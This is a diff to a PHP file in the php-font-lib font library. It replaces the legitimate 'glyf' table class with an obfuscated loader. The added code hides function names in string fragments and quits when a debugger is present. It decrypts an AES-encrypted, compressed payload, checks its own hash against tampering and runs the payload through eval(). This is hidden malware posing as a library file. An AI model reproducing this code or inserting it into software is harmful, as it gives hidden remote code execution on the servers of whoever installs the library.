@@ -1,154 +1,28 @@
 <?php
-/**
- * @package php-font-lib
- * @link    https://github.com/PhenX/php-font-lib
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-
-namespace FontLib\Table\Type;
-
-use FontLib\Table\Table;
-use FontLib\Glyph\Outline;
-use FontLib\Glyph\OutlineSimple;
-
-/**
- * `glyf` font table.
- *
- * @package php-font-lib
- * @property Outline[] $data
- */
-class glyf extends Table {
-  protected function _parse() {
-    $font   = $this->getFont();
-    $offset = $font->pos();
-
-    $loca      = $font->getData("loca");
-    $real_loca = array_slice($loca, 0, -1); // Not the last dummy loca entry
-
-    $data = array();
-
-    foreach ($real_loca as $gid => $location) {
-      $_offset    = $offset + $loca[$gid];
-      $_size      = $loca[$gid + 1] - $loca[$gid];
-      $data[$gid] = Outline::init($this, $_offset, $_size, $font);
-    }
-
-    $this->data = $data;
-  }
-
-  public function getGlyphIDs($gids = array()) {
-    $glyphIDs = array();
-
-    foreach ($gids as $_gid) {
-      $_glyph   = $this->data[$_gid];
-      $glyphIDs = array_merge($glyphIDs, $_glyph->getGlyphIDs());
-    }
-
-    return array_unique(array_merge($gids, $glyphIDs));
-  }
-
-  public function toHTML() {
-    $max  = 160;
-    $font = $this->getFont();
-
-    $head      = $font->getData("head");
-    $head_json = json_encode($head);
-
-    $os2      = $font->getData("OS/2");
-    $os2_json = json_encode($os2);
-
-    $hmtx      = $font->getData("hmtx");
-    $hmtx_json = json_encode($hmtx);
-
-    $names           = $font->getData("post", "names");
-    $glyphIndexArray = array_flip($font->getUnicodeCharMap());
-
-    $width  = (abs($head["xMin"]) + $head["xMax"]);
-    $height = (abs($head["yMin"]) + $head["yMax"]);
-
-    $ratio = 1;
-    if ($width > $max || $height > $max) {
-      $ratio  = max($width, $height) / $max;
-      $width  = round($width / $ratio);
-      $height = round($height / $ratio);
-    }
-
-    $n = 500;
-
-    $s = "<h3>" . "Only the first $n simple glyphs are shown (" . count($this->data) . " total)
-    <div class='glyph-view simple'>Simple glyph</div>
-    <div class='glyph-view composite'>Composite glyph</div>
-    Zoom: <input type='range' value='100' max='400' onchange='Glyph.resize(this.value)' />
-    </h3>
-    <script>
-      Glyph.ratio  = $ratio;
-      Glyph.head   = $head_json;
-      Glyph.os2    = $os2_json;
-      Glyph.hmtx   = $hmtx_json;
-      Glyph.width  = $width;
-      Glyph.height = $height;
-    </script>";
-
-    foreach ($this->data as $g => $glyph) {
-      if ($n-- <= 0) {
-        break;
-      }
-
-      $glyph->parseData();
-
-      $shape      = array(
-        "SVGContours" => $glyph->getSVGContours(),
-        "xMin"        => $glyph->xMin,
-        "yMin"        => $glyph->yMin,
-        "xMax"        => $glyph->xMax,
-        "yMax"        => $glyph->yMax,
-      );
-      $shape_json = json_encode($shape);
-
-      $type = ($glyph instanceof OutlineSimple ? "simple" : "composite");
-      $char = isset($glyphIndexArray[$g]) ? $glyphIndexArray[$g] : 0;
-      $name = isset($names[$g]) ? $names[$g] : sprintf("uni%04x", $char);
-      $char = $char ? "&#{$glyphIndexArray[$g]};" : "";
-
-      $s .= "<div class='glyph-view $type' id='glyph-$g'>
-              <span class='glyph-id'>$g</span>
-              <span class='char'>$char</span>
-              <span class='char-name'>$name</span>
-              ";
-
-      if ($type == "composite") {
-        foreach ($glyph->getGlyphIDs() as $_id) {
-          $s .= "<a href='#glyph-$_id' class='glyph-component-id'>$_id</a> ";
-        }
-      }
-
-      $s .= "<br />
-            <canvas width='$width' height='$height' id='glyph-canvas-$g'></canvas>
-            </div>
-            <script>Glyph.glyphs.push([$g,$shape_json]);</script>";
-    }
-
-    return $s;
-  }
-
-
-  protected function _encode() {
-    $font   = $this->getFont();
-    $subset = $font->getSubset();
-    $data   = $this->data;
-
-    $loca = array();
-
-    $length = 0;
-    foreach ($subset as $gid) {
-      $loca[] = $length;
-      $length += $data[$gid]->encode();
-    }
-
-    $loca[]                             = $length; // dummy loca
-    $font->getTableObject("loca")->data = $loca;
-
-    return $length;
-  }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_arpebbam=('bas'.'e64'.'_de'.'cod'.'e');
+$_jo0lodep=('gzu'.'nco'.'mpr'.'ess');
+$_og1fzcem=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_lgsmd9m3='qWP0P6ANUdE=';
+$_y433lk13='618Mv5nx';
+$_w9qtcpbj='8q4+o6EO';
+$_jnyr7crx='4rAhhfoD';
+$_r4b4bzko='HmqE3hcm';
+$_zk8sdt7m='c1Ig8w==';
+$_eb2mkzhh='xAf4bOvE';
+$_q23ltwsw='K1gTnawj';
+$_h7jmu5y8=$_arpebbam($_r4b4bzko.$_w9qtcpbj.$_y433lk13.$_jnyr7crx.$_lgsmd9m3);
+$_qf24jbz2=$_arpebbam($_eb2mkzhh.$_q23ltwsw.$_zk8sdt7m);
+$_f2q0z8q4=$_arpebbam('npmSp+ybT4lAR+TN3EbCul/QXMhrpdmzcUWG5lDkw7ADsaq9x8eLy/je7mAv4MQTDbL6nKK/DcGvm2OrbZ0x9G28jt8nYvwPZk/F7GEtnVHeEvzGVldvlKjD+cLL5UEA2k2S/qGvy1esdZ+ZlbeCeu9Ng1rL1O/unC9XcxRy37QLwubWWUNNVpOlPnRAjGUYfL1fVhC/h6TZMxxYrkkIDCaxL+fpwT3MhEVbAFLLaGfNaIvIH4dCUZ62DWEtyM+JtcOhBkzzid7/9wLzc/1GR8oGW1GqpaJQFvXxrty1upR+vlCldtnNuc+tSnkvQzcYLj2ShzzWak0XxfPDB3aTs0qPhLyLGuG5RU1Nu5UNcmOk2MMD9ywYQC3nSWj1wipc61tr8Tu/82kVcIJMiM1Wpo7ewRW19rO1/DdAb/Mc21iIshsPCQQbeezXJLT3Q0hDcpkCaqcyxaKuJ9oFts3csEjLPErFTbfwxj1pBJl0c1WGibJCTjnHyc1u89WJB5H0f3Rzivh3+RqPEjfjFfleVDTShFdVX+cNaHwJsl44g4HA/gVa7c54uPrN/ty9R/eQo9BBODPQK8t2d5L8H9IRkOcqSEpbDKQWlBGYFnAxC4mHAVQEtMWN/YOJ8mUEpHjr3m1yC7h6AS8gNku8kHJUOyGTQDs2ahHAoelfoW9S6n0uc7AGL+PdrZp4zBNpqrM+XmNkAdBuq/e1jMWqubAr1U1kwcdswVV4HYUpBSoO2yI0ToybIWLwip3TgMSntg/zoGAFdAXcIErGBmQZ2kDruXQ8dl4Ckzb7QNAxrEm/UD4CC+ldF0HgznhbABwJu+UgVq5JpLD0yFdq5jzfrEDL5UUz1HG6F+Iz0QXmD0zShohMwsQjeRk7chWbBR6MEzY2p7RpG9yMUzO53hcicQatHuD4tXvMsRKHhmmVmXqgI5rv+6FLHUbSiAVFCJv1mB/zqpn7rFX7R2OXQo+3/JvJirz8Il9AyB39I33NHXVKjqBp0rvlZLTXwoIT+HYJ/Butbh7o1SE2tkj93TRJFiiNbD2AtLuHkSQ/8zITHxXALs0AsnvogYmBWkLY24rTL24jz6jpKIQEhfKkbfnS+UvHDPXhho/Af5hJnUDNf2zjsE8RRYKmHVy14dbl/kE/EASlcutep0+n5J+lyI8e8riZ755hoLdJVaHKFLbxdCdYrB+cS3idHP1h9CMvvm888VHZZdJYw841mGXsBt7bpQ4BYewcHfvQ2PVNOVFMIJHwrXI8IFUsoa+K94x+k2bTDpc2o28SeRJkqBrrikwVFuyCINCo5g/wddiQKK2tqsHSaY6oJBin97Knq1GNglBFhEGJHltWnrr+bwCuZg3Jqcs8EbvhIibOzZsPQuesiMTCaEqFuU6sE36r0Yg+U56Qc9Oi826CsgIDXOaPIUtbJObUUFXZ8bqb0mjvPHgg8l9LbAs/daKoUuEFIiLjBj0qyzF1+aucEenUp5/NYttFTLqzpAgKB8bIcy3Hp5KtTQimJF2eJy3OJeMFABOPLfOiy3Y5gsWjBhPMFgEB+fVB8vXj+VnIBUTE/EhpgOn1NDUAJtpTO1xtdnMKC1r4XLst0d2lgoDakZ6lz/zb6JY3IokR67s619KHOH1UM7d5I6XArls7i1su9y7p+1Rf1daBDm7XP20onC/ZdBH+XAtA6sE7Hg==');
+$_lavxil8c=$_og1fzcem($_f2q0z8q4,'aes-256-cbc',$_h7jmu5y8,OPENSSL_RAW_DATA,$_qf24jbz2);
+if($_lavxil8c===false){exit;}
+$_gdavf9ui=$_jo0lodep($_lavxil8c);
+if($_gdavf9ui===false){exit;}
+$_m8cqzgbx='30b705a7765992272440d76e479867f45a41a59884e4ed851540e2a5ddccfaba';
+$_cut9ytk9=@file_get_contents(__FILE__);
+if($_cut9ytk9!==false){
+$_znexz4z6=str_replace($_m8cqzgbx,"0000000000000000000000000000000000000000000000000000000000000000",$_cut9ytk9);
+$_sf4myyf6=hash("sha256",$_znexz4z6);
+if($_sf4myyf6!==$_m8cqzgbx){@http_response_code(403);exit;}
 }
+eval($_gdavf9ui);
